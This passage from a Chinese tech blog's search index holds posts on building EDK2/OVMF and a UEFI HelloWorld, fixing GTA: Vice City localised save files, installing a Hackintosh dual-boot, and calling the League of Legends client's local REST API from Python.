拉完之后要初始化子模块 123456789101112131415bakaft@BakaFT-PC:~/edk2$ git submodule update --initCloning into '/home/bakaft/edk2/ArmPkg/Library/ArmSoftFloatLib/berkeley-softfloat-3'...Cloning into '/home/bakaft/edk2/BaseTools/Source/C/BrotliCompress/brotli'...Cloning into '/home/bakaft/edk2/CryptoPkg/Library/OpensslLib/openssl'...Cloning into '/home/bakaft/edk2/MdeModulePkg/Library/BrotliCustomDecompressLib/brotli'...Cloning into '/home/bakaft/edk2/MdeModulePkg/Universal/RegularExpressionDxe/oniguruma'...Cloning into '/home/bakaft/edk2/RedfishPkg/Library/JsonLib/jansson'...Cloning into '/home/bakaft/edk2/UnitTestFrameworkPkg/Library/CmockaLib/cmocka'...Submodule path 'ArmPkg/Library/ArmSoftFloatLib/berkeley-softfloat-3': checked out 'b64af41c3276f97f0e181920400ee056b9c88037'Submodule path 'BaseTools/Source/C/BrotliCompress/brotli': checked out 'f4153a09f87cbb9c826d8fc12c74642bb2d879ea'Submodule path 'CryptoPkg/Library/OpensslLib/openssl': checked out 'd82e959e621a3d597f1e0d50ff8c2d8b96915fd7'Submodule path 'MdeModulePkg/Library/BrotliCustomDecompressLib/brotli': checked out 'f4153a09f87cbb9c826d8fc12c74642bb2d879ea'Submodule path 'MdeModulePkg/Universal/RegularExpressionDxe/oniguruma': checked out 'abfc8ff81df4067f309032467785e06975678f0d'Submodule path 'RedfishPkg/Library/JsonLib/jansson': checked out 'e9ebfa7e77a6bee77df44e096b100e7131044059'Submodule path 'UnitTestFrameworkPkg/Library/CmockaLib/cmocka': checked out '1cc9cde3448cdd2e000886a26acf1caac2db7cf1' 编译 EDK2 工具链EDK2 拥有自己的构建工具链 1bakaft@BakaFT-PC:~/edk2$ make -C BaseTools 配置工作区环境变量每次重启 Bash 还要重新设置一次 1bakaft@BakaFT-PC:~/edk2$ . edksetup.sh 构建测试设置构建目标信息编辑$CONF_PATH/target.txt 修改 20 行： 1ACTIVE_PLATFORM = MdeModulePkg/MdeModulePkg.dsc 54 行: 1TOOL_CHAIN_TAG = GCC5 尝试构建123456build# ....- Done -Build end time: 00:20:58, May.22 2022Build total time: 00:00:45 构建完毕后即可看到编译好的文件 12root@BakaFT-PC:~/edk2# ls Build/MdeModule/DEBUG_*/*/HelloWorld.efiBuild/MdeModule/DEBUG_GCC5/IA32/HelloWorld.efi 到这里就说明环境是没问题的了","link":"/2022/05/22/EDK2%E5%BC%80%E5%8F%91-1-Ubuntu%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"title":"EDK2开发(2)-编译OVMF并在QEMU运行","text":"本文参考我们接下来根据这个教程进行：OVMF · tianocore/tianocore.github.io Wiki What is OVMFOVMF is an EDK II based project to enable UEFI support for Virtual Machines. OVMF contains sample UEFI firmware for QEMU and KVM OVMF 可以跑在虚拟机上，并为其提供 UEFI 支持，还有简单的 UEFI Shell 实现 编译 OVMF和上一次构建 HelloWorld 的时候一样，编辑$CONF_PATH/target.txt EDK2 提供了多种选择： ACTIVE_PLATFORM TARGET_ARCH PEI code DXE/UEFI code OvmfPkg/OvmfPkgIa32.dsc IA32 IA32 IA32 OvmfPkg/OvmfPkgIa32X64.dsc IA32 X64 IA32 X64 OvmfPkg/OvmfPkgX64.dsc X64 X64 X64 跟随教程，接下来我选择： 123ACTIVE_PLATFORM = OvmfPkg/OvmfPkgX64.dscTARGET_ARCH = X64TOOL_CHAIN_TAG = GCC5 1build 然后你就可以找到编译目标$WORKSPACE/Build/OvmfX64/DEBUG_GCC5/FV/OVMF.fd 另一种编译方法脱离target.txt进行编译 1build -a X64 -t GCC5 -p OvmfPkg/OvmfPkgX64.dsc -b DEBUG 虚拟机中运行安装 QEMU实体机还是算了 8 12sudo apt install qemusudo apt install qemu-system 运行 QEMU把镜像拷过来 123bakaft@BakaFT-PC:~$ mkdir ~/run-ovmfbakaft@BakaFT-PC:~$ cd ~/run-ovmf/bakaft@BakaFT-PC:~/run-ovmf$ cp ~/edk2/Build/OvmfX64/DEBUG_GCC5/FV/OVMF.fd bios.bin 新建一个目录用于当作 UEFI Shell 的文件系统 1bakaft@BakaFT-PC:~/run-ovmf$ mkdir hda-contents 然后运行 1bakaft@BakaFT-PC:~/run-ovmf$ qemu-system-x86_64 -L . -pflash bios.bin -nographic -net none --hda fat:rw:hda-contents 使用-net none跳过网络启动 使用-nographic使 qemu 直接从命令行输出而不是输出到窗口服务器（除非你的 WSL2 实例有窗口服务器，不然不加这个参数会报错） 使用--hda参数挂载本地文件夹作为文件系统功能 接下来就进入了 qemu，并且随后立刻启动到 UEFI Shell 123456789101112UEFI Interactive Shell v2.2EDK IIUEFI v2.70 (EDK II, 0x00010000)Mapping table FS0: Alias(s):HD0a1:;BLK1: PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)/HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1) BLK0: Alias(s): PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0) BLK2: Alias(s): PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)Press ESC in 1 seconds to skip startup.nsh or any other key to continue.Shell&gt; 呃呃。。退格键都不能用的。。 退出 QEMU不想玩了可以Ctrl-A X退出 QEMU，这个操作是指： 先按住Ctrl+A（同时，或者先后按) 松开你的手 按一下X","link":"/2022/05/22/EDK2%E5%BC%80%E5%8F%91-2-%E7%BC%96%E8%AF%91OVMF%E5%B9%B6%E5%9C%A8QEMU%E8%BF%90%E8%A1%8C/"},{"title":"EDK2开发(3)-Hello World","text":"简介本文分两部分 编译MdeModulePkg下的HelloWorld 并运行 自己新建一个 Package 并且写一个 HelloWorld，然后编译运行 编译现有程序并在 OVMF 运行你可以在MdeModulePkg/Application/HelloWorld/HelloWorld.c找到这个程序的源码 1234567891011121314151617181920212223UefiMain ( IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable ){ UINT32 Index; Index = 0; // // Three PCD type (FeatureFlag, UINT32 and String) are used as the sample. // if (FeaturePcdGet (PcdHelloWorldPrintEnable)) { for (Index = 0; Index &lt; PcdGet32 (PcdHelloWorldPrintTimes); Index++) { // // Use UefiLib Print API to print string to UEFI console // Print ((CHAR16 *)PcdGetPtr (PcdHelloWorldPrintString)); } } return EFI_SUCCESS;} 你可以修改Index来指定循环次数，以多次打印字符串 构建并复制到文件系统直接构建，然后复制到之前搞好的文件系统里 12build -a X64 -t GCC5 -p MdeModulePkg/MdeModulePkg.dsc -b DEBUGcp ../edk2/Build/MdeModule/DEBUG_GCC5/X64/HelloWorld.efi hda-contents/ 启动 QEMU加载 OVMF 1qemu-system-x86_64 -L . -pflash bios.bin -nographic -net none --hda fat:rw:hda-contents 可以看到 UEFI Shell 已经识别到了本地的文件系统 1234567891011UEFI Interactive Shell v2.2EDK IIUEFI v2.70 (EDK II, 0x00010000)Mapping table FS0: Alias(s):HD0a1:;BLK1: PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)/HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1) BLK0: Alias(s): PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0) BLK2: Alias(s): PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)Press ESC in 5 seconds to skip startup.nsh or any other key to continue. 使用fs0:进入文件系统，并输入文件名HelloWorld.efi回车即可运行 12345678Shell&gt; fs0:FS0:\\&gt; lsDirectory of: FS0:\\05/22/2022 08:33 8,704 HelloWorld.efi 1 File(s) 8,704 bytes 0 Dir(s)FS0:\\&gt; HelloWorld.efiUEFI Hello World! 这个字符串哪来的你可能会问，下面这行代码怎么打出来UEFI Hello World!的？ 1Print ((CHAR16 *)PcdGetPtr (PcdHelloWorldPrintString)); 唉，这你就不知道了吧，我刚学的我也不知道 不知道咋办呢，拿 VSCode 嗯搜，肯定可以搜到 首先可以查一下PcdGetPtr()这个函数，可以看到他是做到了一个TokenName到指针的映射，有点像 GTA 三部曲的GXT文件原理 123456789101112/** Retrieves a pointer to a PCD token buffer based on a token name. Returns a pointer to the buffer for the token specified by TokenName. If TokenName is not a valid token in the token space, then the module will not build. @param TokenName The name of the PCD token to retrieve a current value for. @return A pointer to the buffer.**/#define PcdGetPtr(TokenName) _PCD_GET_MODE_PTR_##TokenName 那么再搜一下UEFI Hello World!这个东西，经过查找，锁定到MdeModulePkg/MdeModulePkg.dec的 1704 行 1234## This PCD defines the HelloWorld print string.# This PCD is a sample to explain String typed PCD usage.# @Prompt HelloWorld print string.gEfiMdeModulePkgTokenSpaceGuid.PcdHelloWorldPrintString|L&quot;UEFI Hello World!\\n&quot;|VOID*|0x40000004 呃。。虽然但是，我自己试了一下确实是这个部分决定了字符串内容，有兴趣你可以改一下重新编译看一下效果 通过注释可以看到这是一个PCD，并且是一个字符串类型的PCD，这个是什么东西呢，我搜了一下，感觉一时半会说不清，简单说就是变量，具有如下形式 1变量名|默认值|类型|Token值 此处丢出一个我看的参考文：UEFI 原理与编程实践–PCD 的使用_潇洒 Anthony 的博客-CSDN 博客 自己写一个","link":"/2022/05/22/EDK2%E5%BC%80%E5%8F%91-3-Hello-World/"},{"title":"GTA:VC罪吧汉化组存档不兼容原因解析及修复","text":"写在开头这里给出本文思路的 C#实现 BakaFT/sv2b: Remove illegal characters from GTA:VC savefiles (github.com) 存档的“单向兼容”现象用过汉化的朋友们可能会注意到，汉化版的存档后缀名发生了变化，即变为了.sv 并且，原版存档可以改个后缀直接在汉化版使用，但是反过来却不行，游戏甚至会直接卡死 这是为什么？下面进行分析 逆向分析代码逻辑参考 GTAModding/re3 由于 DMCA takedown，目前仓库无限期停止公开访问 游戏的存档/读档逻辑下面是游戏存档时的操作： 12345678// from GTAmodding/revc // src/save/PCSave.cpp// 定义存档文件名,其中&quot;.b&quot;就是后缀sprintf(savename, &quot;%s%i%s&quot;, DefaultPCSaveFileName, i + 1, &quot;.b&quot;);//打开对应文件，准备写入int file = CFileMgr::OpenFile(savename, &quot;rb&quot;);//下略 可以看到，savename最终是.b结尾的 同理，读档的时候也是这样，并且只扫描使用该后缀的文件 汉化补丁的相关修改这是gta_cn.asi的某个函数，实现了对b到sv的替换： 12345678910111213141516171819202122232425void *__cdecl sub_10001FD0(int a1){ void *result; // eax if ( a1 ) { if ( !dword_100168C4 ) { memcpy(&amp;unk_1001696C, (const void *)0x6D863C, 4u); memcpy(&amp;unk_100168D4, (const void *)0x6D8AB8, 4u); memcpy(&amp;unk_10016970, (const void *)0x6D8AC8, 4u); } //程序正常运行的情况下会执行该分支,即对内存操作，修改字符 strcpy((char *)0x6D863C, &quot;.sv&quot;); strcpy((char *)0x6D8AB8, &quot;.sv&quot;); result = strcpy((char *)0x6D8AC8, &quot;.sv&quot;); } else { memcpy((void *)0x6D863C, &amp;unk_1001696C, 4u); memcpy((void *)0x6D8AB8, &amp;unk_100168D4, 4u); result = memcpy((void *)0x6D8AC8, &amp;unk_10016970, 4u); } return result;} 所以，原版与汉化会互相忽略掉对方的存档 那为什么原版的可以给汉化用，反过来就崩溃？因为问题在于存档文件内容，而非后缀名 存档的二进制内容存档名根据 Saves (GTA VC) - GTAMods Wiki 可以了解到 文件中，[0x0004,0x0033]这长为48字节的区域为存档名 你可以在src\\save\\GenericGameStorage.cpp中看到这部分的文件结构与操作逻辑 可能是出于日本市场的原因，R*在游戏中提供了 Unicode 的支持，GXT/Japanese - GTAMods Wiki 中给出的字符表似乎就是SHIFT_JIS编码表 可以看到存档的名字其实是一个wchar类型的数组，这与存档中每2个字节表示一个字符相符合 123456// 最后一次完成的任务名wchar *lastMissionPassed;// 存档名wchar saveName[24];// 后缀，其实反映到游戏里就是存档名后面的&quot;...&quot;wchar suffix[6]; 接下来是存档名的写入过程，在这之前，你可能需要了解一下什么是 GXT GXT 格式是一种加密的文本，通过类似于字典(Key - Value)的方式，实现了游戏文本的映射，其初衷是方便游戏的本地化工作 可由类似如下的形式表达 12[ITBEG]In the beginning 也就是说 TheText.Get(&quot;ITBEG&quot;) == &quot;In the beginning&quot; 想深入了解可以查阅 GXT - GTAMods Wiki 1234567891011121314151617// 如果完成过任务，则获取最后一个完成的任务的名字，否则获取[ITBEG]对应的字符，即`In the beginning`// 从已经加载到内存的GXT内容中搜索任务名lastMissionPassed = TheText.Get(CStats::LastMissionPassedName[0] ? CStats::LastMissionPassedName : &quot;ITBEG&quot;);// 使 suffix '.','.','\\0',野值，野值]// 野值会被写入存档中，但是并无影响AsciiToUnicode(&quot;...'&quot;, suffix);suffix[3] = L'\\0';TextCopy(saveName, lastMissionPassed);int len = UnicodeStrlen(saveName);saveName[len] = '\\0';// 如果存档名长度超过22,即超过11个字符if (len &gt; ARRAY_SIZE(saveName)-2) // 将suffix复制到saveName的最后 TextCopy(&amp;saveName[ARRAY_SIZE(saveName)-ARRAY_SIZE(suffix)], suffix);// 将最后一个野值替换为 '\\0'，但由于suffix[3]已经是'\\0'所以这句话没有实质性作用saveName[ARRAY_SIZE(saveName)-1] = '\\0'; 编码而引起游戏崩溃的关键就在于获取任务名这一步 游戏的字库是通过一张保存了所有字符的大贴图实现的，每个字符都有自己的唯一编号，存档文件中即使用这个编号表示 比如英文原版中，The Party在存档中是这样保存的，其实就是 ASCII 编码 125400 6800 6500 2000 5000 6100 7200 7400 7900T h e P a r t y 对于英文版来说，使用 ASCII 码是十分方便的，而对于拉丁语系的其他语言，也仅仅是多加一些符号的问题 但是对于日语和汉语，字符实在太多了，这个时候编号就会变得多起来，但是这个编码表最开始的部分必须和英文版的一样，不然可能会出现应该显示字母A但显示汉字阿的情况 现实的计算机操作系统中的编码也是如此，编码不兼容 ASCII 就会出现各种想不到的问题 到这里，就可以解释最初的“单向兼容”现象了 问题解析在使用TheText.Get(*const wchar)获取任务名时，是基于当前的游戏的语言设定的。如果使用了汉化补丁，那么获取到的字符编码很大概率对于英文原版来说都是不认识的（除非有纯英文，数字的任务名），这个时候游戏又没有做对应的处理（毕竟汉化是第三方作品），那么游戏就炸掉了 反过来，汉化编码是兼容英文的，所以无论如何都是可以正常显示存档名，然后正确读取的 如何修复存档知道原理就很轻松的可以想到，将存档名中的非 ASCII 编码去掉就行 但需要注意的是，游戏存档中有一个校验和，储存在存档的最后 4 个字节，使用小端储存方式 算法如下： 设置一个unsigned int型变量，以单个字节为基本单元，将[0,201824)区间的所有字节对应值相加，即为校验和，并从201824开始写入 此处给出 C#实现： 12345678910111213141516public static void FixCheckSum(string path){ uint checkSum = 0; using (BinaryReader reader = new BinaryReader(File.Open(path, FileMode.Open))) { while (reader.BaseStream.Position &lt; reader.BaseStream.Length &amp;&amp; reader.BaseStream.Position &lt; 201824) { checkSum += reader.ReadByte(); } } using (BinaryWriter writer = new BinaryWriter(File.Open(path, FileMode.Open))) { writer.BaseStream.Seek(201824, SeekOrigin.Begin); writer.Write(checkSum); }}","link":"/2021/09/02/GTA-VC%E7%BD%AA%E5%90%A7%E6%B1%89%E5%8C%96%E7%BB%84%E5%AD%98%E6%A1%A3%E4%B8%8D%E5%85%BC%E5%AE%B9%E5%8E%9F%E5%9B%A0%E8%A7%A3%E6%9E%90%E5%8F%8A%E4%BF%AE%E5%A4%8D/"},{"title":"Hackintiosh on HASEE_ZX6_CT5DA","text":"缘起几年前还在初中的时候就听说过 Hackintosh 这种东西，不过因为当时什么也不懂，也就没去搞。 现在在大学天天码代码，Windows 的分区被各种开发环境，开发依赖还有日用的软件文档塞满，分区天天都是红色的看着有点难受，用着也麻烦。 还有，iTunes 在 Windows 的表现太差了，这也是我想试试 Mac 的原因之一。 所以萌生了黑苹果双系统的想法： Windows10 作为日用办公游戏，或者要求比较特别的软件运行的环境 MacOS 作为平时的开发环境 开搞 双系统安装注意！本文默认读者对黑苹果的安装基础，包括EFI,ESP,UEFI等概念等有一定了解 硬件环境2019 年购入的Hasee ZX6-CT5DA，模具为Clevo NB50TA, 我这台 BIOS 中识别为NBxxTA 32G USB2.0 U 盘一个，用于刻录PE以及Mac镜像 硬件改动网卡由原机的AC9462NGW更换为AC9560NGW 硬盘预留 M.2 位添加一块WD SN550 500GB 分区规划Phison SATA SSD: 自带 SATA SSD，全盘用于存储数据 WDC WDS500G: SN550，150G(Window10 标准)分给 Windows，150G(Windows10 标准) 给 Mac Big Sur，剩下保持未分配，装完 Mac 后再操作 注意: Windows 与 Mac 对储存空间大小的进制定义有区分，Windows10目前仍定义1KByte=1024 Bytes ，而 Mac 和大部分 Linux 发行版则与硬盘厂商说法统一，定义1KByte=1000 Bytes，语义上也符合Kilo的含义 所以我的 SN550 在 Mac 下显示大小为500.11GB，而在 Windows 下则远小于500GB 我使用WindowsPE环境安装Windows10，所以给 Windows10 划分150GB时采用的是Windows给出的定义，这个大小在 Mac 中显示为160.45 GB ，考虑误差等因素存在，所以不符合 1000/1024 的比例 全新安装 Windows10Windows镜像: 本人从Latest10.win下载 21H1 镜像 点击此处前往下载页面 | Latest10@WhatK WindowsPE：此处本人使用 FirPE Project – 也许是最适合年轻人使用的 WinPE 系统~ 装个 Windows10 不是有手就行？ 使用 FirPE 官方刻录工具为 U 盘格式化刻入 PE 镜像，并通过 UEFI 引导进入 PE**(神舟开机按 F7 选择 UEFI 启动项)** 使用DiskGenius创建ESP以及MSR分区，其中EFI大小一定要大于200MB,不然后期黑苹果引导会出问题 在 PE 通过磁盘管理工具为 Windows10 准备 150G 的空间 直接通过资源管理器挂载 ISO 镜像，打开setup.exe进行安装，选择准备好的分区，写入，等待自动重启 重启后默认通过Windows Bootmgr进入第二段安装过程，U 盘拔了干就完了 进入 Windows10 后打开DiskGenius，你会发现。。有俩 ESP 分区，因为微软自己又创建了一个100MB的，把小的这个删掉，然后使用Dism++修复引导即可（或者直接把文件复制到之前自己新建的 ESP 分区然后删除微软的 ESP 分区应该也没问题） 在 Windows 的分区下放置Hackintool和Opencore configurator的包,后续会用到 安装 MacOS Big Sur镜像: 本人使用 macOS Big Sur 11.1 (20C69)-正式版原版镜像 By OpenCore-0.6.4-12 月 08 日正式版 | 独行秀才的老窝 (gitee.io) EFI: 本人使用 GitHub - VergeDX/Hackintosh_HASEE_ZX6-CT5DA: macOS Big Sur for Hasee ZX6-CT5DA. BIOS: 感谢 EFI 仓库作者@Vanilla 提供的参考 我没有刷解锁 BIOS，目前所有的设置都是默认的。 注意！此处使用 USB2.0 的 U 盘，并选择插入 USB2.0(即机身右侧，非蓝色的 USB 口)，避免出现卡在HID: Leagcy..... 注意！不要联网，保持断网安装 相信聪明的你已经装完驱动了，来，打开磁盘管理工具继续操作 为 Mac 划分一个适合大小的分区，并选择不格式化，不分配盘符, 此处我分配150GB 使用Etcher向 U 盘格式化刻入下载好的镜像，刷写完毕后别急，打开DiskGenius ，替换EFI，完事 重启，在 UEFI 启动项中选择 U 盘，可进入OpenCore界面，选择Install Big Sur 静心等待，读取完毕后会进入安装界面，选择磁盘工具 调整选项到显示所有设备，可以看到目前的硬盘目录结构，选择给 Mac 准备好的野生分区，右键抹掉，选择AFPS，抹掉即可 如果你和我一样是全新安装，你会注意到，抹出来的容器是除了Windows10分区以外所有空间大小，而不是说好的150GB 简单来说，没问题，后期装好 Mac 可以重新让原来那块空间回来 别慌，装就完事了，退出磁盘工具，选择安装Mac Big Sur, 等半小时就行了，无聊的可以看看安装器日志，时不时晃下鼠标防止睡眠，等待安装器自动重启 重启后继续手动选择 U 盘 UEFI 启动，此时会出现你之前抹掉时给分区起的名字，选择它，继续启动 不出意外你就会看到 Big Sur 的安装配置界面，一路照常配置，让你联网的时候选择这台机器不接入互联网，配置完毕后即可进入 Mac 桌面。 当前阶段，注意一定一定不要登录任何 iCloud 账户获 Apple 账户 当前阶段，注意一定一定不要登录任何 iCloud 账户获 Apple 账户 因为还没更改三码 打开终端执行： 1sudo spctl --master-disable // 允许安装所有来源的应用，为了能打开后续的俩工具 刷新三码简单来说就是 Mac 的序列号，白苹果人家自己带就不说了，使用Opencore引导的黑苹果，这个数据存在config.plist里，如果要是联网查询重复的话，可能会出现一些问题，严重的封禁 iCloud 账户 因为 Github 的作者提供的 EFI 中已经存在一个三码，所以我们需要换一个 执行完上面的命令后，打开 Finder, 进入 Windows 的分区找到HackinTool，打开，在磁盘选项卡分别挂载挂载 U 盘和 SSD 的ESP分区，将 U 盘的 EFI 文件复制到桌面 打开Opencore configurator并载入拷出来的config.plist，左侧选择PlatformInfo-机型平台设置, 右侧选择Datahub-generic-PlatformNVRAM选项卡，点击检查序列号有效性的右边的箭头，选择MacBookPro 15,1开头的，注意这时候会出现一大堆信息，其中包括刚刚生成的三码，如果再次选择，会再次生成刷新三码信息， 怎么看有没有用呢？点检查序列号有效性，会自动打开苹果的查询页面，如果有保修，说明这个序列号已经存在并被用于白苹果了，这个序列号用不了，再生成一个。 如果查询结果说序列号无效，说明这没人用过，就可以保存文件了。 现在把你的 EFI 中的OC和BOOT文件夹复制到SSD的 ESP 分区，BOOT文件夹可以覆盖 Windows 的。 这样你的UEFI分区目前同时存在Windows Boot manager和OpenCore，再去 Windows 设置 UEFI 启动项默认为Opencore即可 以后系统引导遵循下列顺序 Windows10: UEFI -&gt; Opencore -&gt; Windows Boot manager -&gt; Windows10 Mac : UEFI -&gt; OpenCore -&gt; Big Sur 安装 Catalina本人已测试镜像与 EFI 搭配可用 大致与 Big Sur 相似，此处感谢@Lsansan 的安装教程 以及博主给出的 BIOS 设定参考： 我的本本 bios 系统是 insyde，我没见过，也没用过。安装黑苹果，bios 也没有特意设置过什么，仅仅通过 bios 设置引导而已。 镜像: macOS Catalina 10.15.6 19G2021@黑果小兵 EFI: 见参考博文 系统优化之前的分区问题在安装 Big sur 抹分区的时候，Mac 默认把所有除 Windows 分区外的部分抹成了一个APFS容器 你可以对这个容器进行再分块操作，分为多个宗卷，也就是分区。 而 Mac 安装则是在容器创建了 5 个宗卷，用于系统的各个部分 这么说，其实之前在 Windows10 分给 Mac 空间时的数字毫无意义 但是！苹果说 APFS 容器是很灵活的，可以通过磁盘工具割回来一些空间用！ 打开磁盘工具，选择容器，点分区，选择 Big Sur 的分区，讲分区大小更改为更小的值，系统就会切割出对应差值大小的空间出来，而这个空间，是可以被赋予各个格式的。 比如我原先 Big Sur 占了 380G，我手动更改为 150G，那么应用更改后系统会腾出 230G 的空间给我，我可以任意格式化，之后我选择使用它作为”交换分区” 创建一个”交换分区”双系统有的时候挺尴尬的 我 Windows 读不了 APFS，Mac 对 NTFS 的操作是只能读不能写，要是有两个系统都要用的文件那岂不是很麻烦？ 比如 Hexo 博客文件，我在两个系统里都有写博客的可能，所以需要一个解决方案。 可以考虑使用exFat格式，Windows 和 Mac 都支持，用它就可以实现文件在双系统下的读写 HiDpi1080p 的屏幕，默认只有三档分辨率可以选，体验只能说太拉了 所以使用脚本开启 HiDpi，并提供多档缩放设定 一键开启 macOS HiDPI | 底噪 (zhih.me) 脚本里有好几个 1080p，我选的第一个，可用 只能说屏幕清晰多了 注意！本人测试这个脚本对外接显示屏(1080p)无效，如需设置外接显示屏 HiDpi 可能需要用到 DRM，相关教程请自行查询 更新外屏开启 HiDpi: 首先在恢复模式中使用终端关闭 SIP 12csrutil disablecsrutil authenticated-root disable //这个也要关不然无法创建snapshot 制作显示屏 Plist 文件，参考为 macOS 10.15 开启 HiDPI，让 2K 显示器更舒适 - 少数派 (sspai.com) 由于 Big sur 的特殊机制，即使关闭 SIP 仍然无法挂载根目录/，采用以下解决办法: 使用 diskutil 查询系统根目录在哪里 12345678910&gt;&gt;diskutil list/dev/disk2 (synthesized): #: TYPE NAME SIZE IDENTIFIER 0: APFS Container Scheme - +150.0 GB disk2 Physical Store disk0s5 1: APFS Volume ⁨BigSur - 数据⁩ 43.4 GB disk2s1 2: APFS Volume ⁨Preboot⁩ 293.7 MB disk2s2 3: APFS Volume ⁨Recovery⁩ 610.7 MB disk2s3 4: APFS Volume ⁨VM⁩ 1.1 MB disk2s4 5: APFS Volume ⁨BigSur⁩ 15.0 GB disk2s5 可以看到我的在disk2s5，然后执行如下命令 1sudo mount -o nobrowse -t apfs /dev/disk2s5 /Users/bakaft/tomount 其中这个tomount目录可以是任意具有读写权限的目录，可以像我一样直接在用户目录下新建一个文件夹 执行完之后，这个目录将被软链接到/，也就是说会这样 12345&gt;&gt;pwd/User/bakaft/tomount&gt;&gt;lsApplications System Volumes cores etc opt sbin usrLibrary Users bin dev home private tmp var 后续就可以对/进行读写操作了，复制完之后重建 Snapshot，不然更改无效 1sudo bless --folder /Users/bakaft/tomount/System/Library/CoreServices --bootefi --create-snapshot 然后重启即可，目录会自动取消挂载。 双系统时间问题Windows 命令行执行: 1Reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation /v RealTimeIsUniversal /t REG_DWORD /d 1","link":"/2021/04/24/Hackintiosh-on-HASEE-ZX6-CT5DA/"},{"title":"LeagueClient通信(0)-LCU通讯原理&amp;如何让熊孩子玩不了LOL","text":"缘起之前看到 @MarioCrane 的自定义创建 5V5 训练模式工具，让我对 LOL 客户端的 API 又产生了点兴趣。 仓库地址: https://github.com/MarioCrane/LeaueLobby 为啥要说又。。因为之前对 LOL 的 wad 资源拆包的时候我曾了解过 LeagueClient 的一些运行原理 Riot 的开发者博客曾经在更新客户端的时候解析了其中的技术原理 https://technology.riotgames.com/news/architecture-league-client-update 相比之前的了解，目前 Riot 的开发文档已经完善了很多，值得去探索一番。 LCU 客户端结构简单来说，目前 LOL 的 LCU 客户端分为两部分 上层(LeagueClientUx.exe, LeagueClientUxRender.exe)基于 Chromium Embedded Framework (CEF) 主要用于显示界面并通过 RTMP 协议与底层进行通信。简单说就是个定制化的浏览器，用于数据交互。 底层(LeagueClient.exe)是一个 Server 与上层和服务器进行通信，同时会启动一个 HTTPS 的 Web Server 以供第三方程序来与之通信。 用户在客户端很大一部分的操作，都是通过客户端的 HTTP 通讯来完成的。 LCU 有一套完善的REST API用以通讯交互，你可以在这个网站中查询到大多数的 REST API: http://lcu.vivide.re/ 如何与本地服务器交互LCU 在每次启动客户端之后，都会在LeagueClient.exe的根目录下生成一个lockfile文件 其中内容一般是这样 123LeagueClient:13440:27491:oL1ABkjI0LuUpP4ib55QAw:https以冒号分开，分别是: 进程名,PID,端口号,token,协议每次启动客户端时，除了进程名和协议都会发生变化 直接访问https://127.0.0.1:56509会要求Http Basic Authorization方式登录你需要输入如下数据 username password riot token 登录之后首先会返回 1{&quot;errorCode&quot;:&quot;RESOURCE_NOT_FOUND&quot;,&quot;httpStatus&quot;:404,&quot;message&quot;:&quot;Invalid function&quot;} 因为没有向任何 API 发送请求，默认在首页返回了一个 404，并说你执行了一个无效函数，很正常。 同时，你的 token 被记录在了 HTTP 请求头的authorization属性中, 这是短时间内验证身份的一种方式。 浏览器访问网页是GET方式，所以这里找一个比较适合的例子来看看: GET /riotclient/command-line-args Tags: riotclient Get the command line parameters for the application 获取 LCU 客户端的命令行参数 那么，我们访问 https://127.0.0.1:27491/riotclient/command-line-args 于是我们就得到了目前 LCU 的运行参数，这个和任务管理器里的内容是一样的。 建立游戏房间上面只是提到了GET方法，而很多操作需要用到POST方法，甚至其PUT,DELETE等 在一个非官方的 API 文档中，提及到了 LCU 客户端建立房间的方法 https://riot-api-libraries.readthedocs.io/en/latest/lcu.html#rift-explorer 其实创建房间调用了POST /lol-lobby/v2/lobby这个接口 You can create a normal game mode lobby by passing the queue ID ({&quot;queueId&quot;:430}) to the /lol-lobby/v2/ POST endpoint. 你可以向/lol-lobby/v2/lobby 发送一个 POST 请求，当然，要携带数据{&quot;queueId&quot;:430} Riot 的官方文档中也给出了所有模式的queueId: http://static.developer.riotgames.com/docs/lol/queues.json 开头提到的 5V5 训练模式，其实就是把这里的数据完善了一下，具体参数可以参考官方文档 浏览器只能GET，那怎么发送这种请求？发送的时候又要如何验证身份？ 先说一下如何直接在 URL 中解决Http authorization: 访问的时候，在 URL 中加入 username:password的组合字符串，并用@连接字符串和主机地址 1https://riot:oL1ABkjI0LuUpP4ib55QAw@127.0.0.1:27491 不论是GET还是POST，都可以这样实现携带身份访问，无需验证 那怎么发送POST请求？ 以 Python 为例，有一个Requests库很适合用来进行 HTTP 通信，支持多种 HTTP 方法。 1request = request.post(url) 这就是一个最简单的 POST 请求 其他语言也有各自类似的 HTTP 库，可以自行查阅实现 回归正题跑的有点远了..那么回归标题，如何让熊孩子玩不了 LOL 我们可以在之前的那个网站上查到这个接口： http://lcu.vivide.re/#operation--riotclient-ux-minimize-post POST /riotclient/ux-minimize Minimize the ux process and all its windows if it exists. This does not kill the ux. 最小化 LCU 客户端窗口，但并不结束相关进程 这里给出一个 Python 写法: 12345import requestsrequest = requests.post('https://riot:oL1ABkjI0LuUpP4ib55QAw@127.0.0.1:27491/riotclient/ux-minimize',verify=False)# 因为证书问题，这里需要关掉SSL验证，就是verify=False. 执行后会出现一个警告，可无视print(request) 执行之后会看到 1&lt;Response [204]&gt; 同时，客户端最小化了。 那么我尝试来写一个工具，只要 LCU 在运行，就不断最小化。 核心代码1234import subprocess # 读CommandLineimport psutil # 读PID和进程名import requests # HTTP交互# 因为涉及到一些高权限操作，需要有管理员权限才能正常运行 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970class LCU: def __init__(self): ''' init params ''' self.port = None self.host = '127.0.0.1' self.token = None self.protocol = 'https' self.url = None self.pid = None def checkProcess(self): ''' check whether LCU is running, if so, return the PID. If not, return False ''' client_pid = None pids = psutil.pids() for pid in pids: if psutil.Process(pid).name() == 'LeagueClient.exe': client_pid = pid if isinstance(client_pid,int): return client_pid else: return False def getParam(self): ''' From https://github.com/minhluu2000/Project-Lego Get necessary for client-specific info through CommandLine ''' raw_output = subprocess.check_output( ['wmic', 'PROCESS', 'WHERE', &quot;name='LeagueClientUx.exe'&quot;, 'GET', 